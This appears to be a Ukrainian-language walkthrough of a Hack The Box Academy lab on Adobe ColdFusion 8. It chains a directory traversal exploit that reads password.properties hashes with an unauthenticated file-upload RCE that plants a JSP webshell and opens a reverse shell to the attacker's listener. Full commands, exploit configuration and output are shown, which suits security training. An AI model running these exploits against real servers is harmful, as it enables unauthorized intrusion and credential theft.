Attacking Common Applications — Attacking ColdFusion
====================================================

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Attacking ColdFusion](https://academy.hackthebox.com/app/module/113/section/2135)
Ціль: `10.129.107.223`
Фінальна відповідь: `arctic\tolis`

Ідея атаки
----------

У нас є Adobe ColdFusion 8 на Windows (`ACADEMY-ACA-ARCTIC`), який:
- слухає порт `8500/tcp` (ColdFusion HTTP);
- вразливий до directory traversal (`CVE-2010-2861`, EDB 14641);
- вразливий до unauthenticated file upload RCE (`CVE-2009-2265`, EDB 50057);
- дозволяє:
  - витягнути `password.properties` із `ColdFusion8/lib`;
  - завантажити JSP webshell через FCKeditor;
  - отримати reverse shell і подивитись, під ким запущено ColdFusion;
- кінцева ціль — дізнатись, під яким користувачем працює ColdFusion (`whoami` → `arctic\tolis`).

Крок 1 — Базове сканування nmap
-------------------------------

На атакуючій машині:

```bash
nmap -p- -sC -Pn 10.129.107.223 --open
```

Що бачимо:

- `135/tcp  open  msrpc`
- `8500/tcp open  fmtp` (ColdFusion web)
- `49154/tcp open  unknown`

Релевантно: порт `8500` — основна поверхня атаки ColdFusion. Подальша робота — HTTP‑вразливості та специфічні ColdFusion експлойти.

Крок 2 — Пошук ColdFusion експлойтів через searchsploit
-------------------------------------------------------

```bash
searchsploit adobe coldfusion
```

Цікавлять:

- `Adobe ColdFusion - Directory Traversal` → `/usr/share/exploitdb/exploits/multiple/remote/14641.py`
- `Adobe ColdFusion 8 - Remote Command Execution (RCE)` → `/usr/share/exploitdb/exploits/cfm/webapps/50057.py`

Висновок: будемо використовувати спочатку `14641.py` для читання конфігів, потім `50057.py` для отримання reverse shell.

Крок 3 — Directory Traversal для password.properties (14641.py)
---------------------------------------------------------------

Копіюємо скрипт у робочу директорію:

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
```

Запускаємо з параметрами, як у модулі/лабі:

```bash
python2 14641.py 10.129.107.223 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

Очікуваний вивід (як у тебе):

```text
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
```

Що важливо:

- ми читаємо `ColdFusion8/lib/password.properties` без автентифікації;
- бачимо `password` та `rdspassword` у зашифрованому/хешованому вигляді;
- це підтверджує `CVE-2010-2861` (directory traversal у ColdFusion 8).

OPSEC/нотатки:

- експлойт брутить кілька ColdFusion endpoint’ів (`_logintowizard.cfm`, `enter.cfm` і т.д.);
- у реальному середовищі це світить у логах веб‑сервера та IDS/IPS.

Крок 4 — Підготовка RCE експлойта (50057.py)
--------------------------------------------

Копіюємо скрипт:

```bash
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Правимо параметри (як ти зробив через `sed`):

```bash
sed -i "s/lhost = .*/lhost = '10.10.14.103'/; \
        s/lport = .*/lport = 4444/; \
        s/rhost = .*/rhost = '10.129.107.223'/; \
        s/rport = .*/rport = 8500/" 50057.py
```

Сенс полів:

- `lhost` — твій HTB VPN IP;
- `lport` — порт для `nc`‑лістера;
- `rhost` — IP ColdFusion сервера;
- `rport` — ColdFusion HTTP порт (8500).

Крок 5 — Запускаємо RCE та отримуємо reverse shell
--------------------------------------------------

Спочатку запускаємо listener:

```bash
nc -lvnp 4444
```

Потім запускаємо експлойт:

```bash
python3 50057.py
```

Фрагмент виводу (твій кейс):

```text
Generating a payload...
Payload size: 1498 bytes
Saved as: e45d29129aec4549867af3f6282b3e80.jsp

...
Sending request and printing response...

<script type="text/javascript">
window.parent.OnUploadCompleted( 0, "/userfiles/file/e45d29129aec4549867af3f6282b3e80.jsp/e45d29129aec4549867af3f6282b3e80.txt", "e45d29129aec4549867af3f6282b3e80.txt", "0" );
</script>

Listening for connection...

Executing the payload...
Listening on 0.0.0.0 4444
Connection received on 10.129.107.223 49377
```

У `nc`‑сесії:

```text
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

Що відбувається:

- JSP‑файл завантажується через FCKeditor `upload.cfm`;
- ColdFusion виконує наш JSP, який створює socket до `10.10.14.103:4444`;
- ми отримуємо Windows shell у контексті ColdFusion runtime.

Крок 6 — Визначаємо, під ким запущено ColdFusion (whoami)
---------------------------------------------------------

У отриманому шеллі виконуємо:

```cmd
whoami
```

Результат (з твоєї сесії):

```text
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

Крок 7 — Нотатки для звіту / подальшої ескалації
------------------------------------------------

Що логічно записати:

- **Вектор 1 (Directory Traversal)**  
  - Використано EDB `14641.py` (`CVE-2010-2861`) для читання `password.properties`.
  - Ризик: витік конфігураційних секретів (паролі до БД, RDS, mail, LDAP).

- **Вектор 2 (Unauthenticated RCE)**  
  - Використано EDB `50057.py` (`CVE-2009-2265`) для завантаження JSP webshell через FCKeditor і отримання reverse shell без автентифікації. 
  - Ризик: повний контроль над хостом з правами `arctic\tolis`.

- **Контекст користувача**  
  - `whoami` → `arctic\tolis`;  
  - далі можна робити стандартну Windows/AD пост‑ексфільтрацію: `whoami /priv`, `net user`, `net localgroup administrators`, `systeminfo`, `ipconfig`, `nltest`, тощо.

Відповідь
---------

**Q1: `arctic\tolis`**

Що тут було вразливим
---------------------

- ColdFusion 8 з FCKeditor, який дозволяє неавтентифікований файл‑аплоад JSP, що дає RCE (`CVE-2009-2265`). [page:2]
- ColdFusion 8 з directory traversal у адмін‑ендпоінтах (`CVE-2010-2861`), який дає читання `password.properties`. [page:2]
- Сервіс ColdFusion запущений під користувачем `arctic\tolis`, що розширює імпакт до поточного користувача ОС, а не лише веб‑контексту.
